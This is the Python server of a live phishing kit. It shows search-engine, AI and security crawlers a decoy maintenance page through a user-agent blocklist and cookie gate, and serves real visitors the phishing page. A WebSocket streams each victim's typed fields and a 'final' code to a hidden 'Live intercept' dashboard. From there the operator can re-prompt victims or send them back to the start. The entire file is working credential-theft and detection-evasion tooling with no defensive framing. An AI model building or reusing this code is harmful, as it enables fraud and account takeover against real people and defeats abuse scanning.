import asyncio
import json
import os
import re
import uuid
from aiohttp import web, WSMsgType

# ==== CONFIG ====
SECRET_DASH = os.environ.get("DASH_SECRET", "dash-elis-secret-9f2a")
PORT = int(os.environ.get("PORT", 8080))
GATE_COOKIE = "_sid_ok"
GATE_VALUE = os.environ.get("GATE_VALUE", "v1a9c")
# ================

sessions = {}
dash_clients = []

# crawlers / scanners / headless that should only ever see the decoy
_BOT_RE = re.compile(
    r"googlebot|adsbot-google|mediapartners-google|feedfetcher|google-inspectiontool|"
    r"bingbot|slurp|duckduckbot|baiduspider|yandex(bot|images)|facebookexternalhit|facebot|"
    r"linkedinbot|twitterbot|applebot|semrush|ahrefs|mj12bot|petalbot|bytespider|"
    r"gptbot|claudebot|anthropic|ccbot|dotbot|rogerbot|screaming frog|ia_archiver|"
    r"safebrowsing|chrome-lighthouse|pagespeed|gtmetrix|pingdom|uptime|"
    r"headlesschrome|phantomjs|selenium|puppeteer|playwright|cyberpatrol|"
    r"curl/|wget/|python-requests|python-urllib|go-http-client|java/|scrapy|"
    r"httpclient|libwww|okhttp|postman|insomnia|httpie|nuget|axios/",
    re.I,
)

def is_bot(request) -> bool:
    ua = request.headers.get("User-Agent", "") or ""
    if len(ua) < 20 or _BOT_RE.search(ua):
        return True
    # real browsers almost always send these; many scanners don't
    if not request.headers.get("Accept-Language"):
        return True
    accept = request.headers.get("Accept", "")
    if accept and "text/html" not in accept and "*/*" not in accept:
        return True
    return False

def has_gate(request) -> bool:
    return request.cookies.get(GATE_COOKIE) == GATE_VALUE

@web.middleware
async def harden_headers(request, handler):
    resp = await handler(request)
    # stop indexing + strip framework fingerprint
    resp.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet"
    resp.headers["Referrer-Policy"] = "no-referrer"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
    resp.headers["Pragma"] = "no-cache"
    if "Server" in resp.headers:
        del resp.headers["Server"]
    return resp

async def robots(request):
    return web.Response(
        text="User-agent: *\nDisallow: /\n",
        content_type="text/plain",
    )

async def index(request):
    # bots / scanners → harmless maintenance page (this is what Safe Browsing should see)
    if is_bot(request):
        return web.FileResponse("./decoy.html")
    # humans without JS gate cookie → soft browser-check (sets cookie via /pass)
    if not has_gate(request):
        return web.FileResponse("./challenge.html")
    return web.FileResponse("./index.html")

async def pass_gate(request):
    # only reachable if something actually requested it (JS does); bots that don't run JS never get the cookie
    if is_bot(request):
        return web.FileResponse("./decoy.html")
    resp = web.HTTPFound("/")
    resp.set_cookie(
        GATE_COOKIE,
        GATE_VALUE,
        path="/",
        max_age=60 * 60 * 12,
        samesite="Lax",
        httponly=False,
        secure=request.secure,
    )
    return resp

def payload_for(sid):
    s = sessions[sid]
    return {
        "sid": sid,
        "ip": s["ip"],
        "data": s["data"],
        "final": s["final"],
        "online": s["online"],
    }

async def broadcast(sid):
    if sid not in sessions:
        return
    dead = []
    for dc in dash_clients:
        try:
            await dc.send_json(payload_for(sid))
        except Exception:
            dead.append(dc)
    for d in dead:
        dash_clients.remove(d)

async def broadcast_remove(sid):
    for dc in list(dash_clients):
        try:
            await dc.send_json({"remove": sid})
        except Exception:
            dash_clients.remove(dc)

async def ws_victim(request):
    # no gate / bot → refuse upgrade so scanners don't fingerprint the live channel
    if is_bot(request) or not has_gate(request):
        return web.Response(status=403, text="forbidden")

    ws = web.WebSocketResponse()
    await ws.prepare(request)
    sid = request.query.get("sid")
    if sid and sid in sessions:
        sessions[sid]["ws"] = ws
        sessions[sid]["online"] = True
    else:
        sid = str(uuid.uuid4())[:8]
        sessions[sid] = {
            "data": {},
            "final": "",
            "ip": request.remote,
            "ws": ws,
            "online": True,
        }
    await ws.send_json({"type": "sid", "sid": sid})
    await broadcast(sid)
    async for msg in ws:
        if msg.type == WSMsgType.TEXT:
            if sid not in sessions:
                break
            d = json.loads(msg.data)
            if d.get("type") == "field":
                sessions[sid]["data"][d["name"]] = d["value"]
            elif d.get("type") == "final":
                sessions[sid]["final"] = d["value"]
            await broadcast(sid)
        elif msg.type == WSMsgType.ERROR:
            break
    if sid in sessions:
        sessions[sid]["ws"] = None
        sessions[sid]["online"] = False
        await broadcast(sid)
    return ws

DASH_HTML = """<!doctype html><meta charset="utf-8"><title>ops</title>
<style>
body{font-family:ui-monospace,Consolas;background:#0b0b0b;color:#eee;padding:20px}
.card{background:#151515;border:1px solid #333;border-radius:8px;padding:14px;margin-bottom:12px}
h3{margin:0 0 8px;font-size:14px;color:#e50914}
pre{margin:0;font-size:13px;white-space:pre-wrap}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px;vertical-align:middle}
.on{background:#0f0;box-shadow:0 0 6px #0f0}.off{background:#555}
.btn{background:#222;border:1px solid #444;color:#eee;border-radius:4px;padding:4px 10px;font-size:12px;cursor:pointer;margin-right:6px}
.btn:hover{background:#333}
.btn.del:hover{background:#5a0d0d;border-color:#e50914}
.btn.ref:hover{background:#0d3a0d;border-color:#0f0}
.btn.ask:hover{background:#3a2a0d;border-color:#fa0}
.row{margin-top:10px}
</style>
<h2>🎯 Live intercept <small style="color:#777">portal</small></h2>
<div id="list"></div>
<script>
let ws;
function connect() {
  ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/wsdash");
  ws.onmessage = e => {
    const m = JSON.parse(e.data);
    if (m.remove) { delete sessions[m.remove]; render(); return; }
    sessions[m.sid] = m;
    render();
  };
  ws.onclose = () => setTimeout(connect, 1500);
}
const sessions = {};
function sendCmd(c) { if (ws.readyState === 1) ws.send(JSON.stringify(c)); }
function del(sid) {
  if (!confirm("Delete log " + sid + "?")) return;
  sendCmd({cmd: "delete", sid: sid});
}
function refill(sid) {
  const s = sessions[sid];
  if (!s || !s.online) { alert("victim is offline — cannot redirect"); return; }
  sendCmd({cmd: "reset", sid: sid});
}
function reask(sid) {
  const s = sessions[sid];
  if (!s || !s.online) { alert("victim is offline — cannot re-ask"); return; }
  sendCmd({cmd: "reask", sid: sid});
}
function render() {
  const vals = Object.values(sessions);
  list.innerHTML = vals.length ? vals.map(s => `<div class="card">
    <h3><span class="dot ${s.online ? "on" : "off"}"></span>Session ${s.sid} <span style="color:#888;font-weight:normal">${s.ip}</span></h3>
    <pre>${JSON.stringify(s.data, null, 2)}</pre>
    <div style="margin-top:6px;color:#0f0">final → ${s.final || "<em style='color:#666'>waiting…</em>"}</div>
    <div class="row">
      <button class="btn ref" onclick="refill('${s.sid}')">🔁 refill — send back to start</button>
      <button class="btn ask" onclick="reask('${s.sid}')">📲 re-ask final</button>
      <button class="btn del" onclick="del('${s.sid}')">🗑 delete log</button>
    </div>
  </div>`).join("") : "<p style='color:#555'>no sessions yet…</p>";
}
connect();
</script>"""

async def dash_page(request):
    return web.Response(text=DASH_HTML, content_type="text/html")

async def ws_dash(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    dash_clients.append(ws)
    for sid in sessions:
        await ws.send_json(payload_for(sid))
    async for msg in ws:
        if msg.type == WSMsgType.TEXT:
            try:
                cmd = json.loads(msg.data)
            except Exception:
                continue
            sid = cmd.get("sid")
            if cmd.get("cmd") == "delete" and sid in sessions:
                s = sessions.pop(sid)
                if s.get("ws"):
                    try:
                        await s["ws"].close()
                    except Exception:
                        pass
                await broadcast_remove(sid)
            elif cmd.get("cmd") == "reset" and sid in sessions:
                s = sessions[sid]
                if s.get("ws"):
                    try:
                        await s["ws"].send_json({"type": "reset"})
                    except Exception:
                        pass
                s["data"] = {}
                s["final"] = ""
                await broadcast(sid)
            elif cmd.get("cmd") == "reask" and sid in sessions:
                s = sessions[sid]
                if s.get("ws"):
                    try:
                        await s["ws"].send_json({"type": "reask"})
                    except Exception:
                        pass
                s["final"] = ""
                await broadcast(sid)
        elif msg.type == WSMsgType.ERROR:
            break
    if ws in dash_clients:
        dash_clients.remove(ws)
    return ws

app = web.Application(middlewares=[harden_headers])
app.router.add_get("/", index)
app.router.add_get("/pass", pass_gate)
app.router.add_get("/robots.txt", robots)
app.router.add_get("/ws", ws_victim)
app.router.add_get(f"/{SECRET_DASH}", dash_page)
app.router.add_get("/wsdash", ws_dash)

if __name__ == "__main__":
    print(f"portal → http://localhost:{PORT}")
    print(f"dashboard → http://localhost:{PORT}/{SECRET_DASH}")
    web.run_app(app, host="0.0.0.0", port=PORT, print=None)
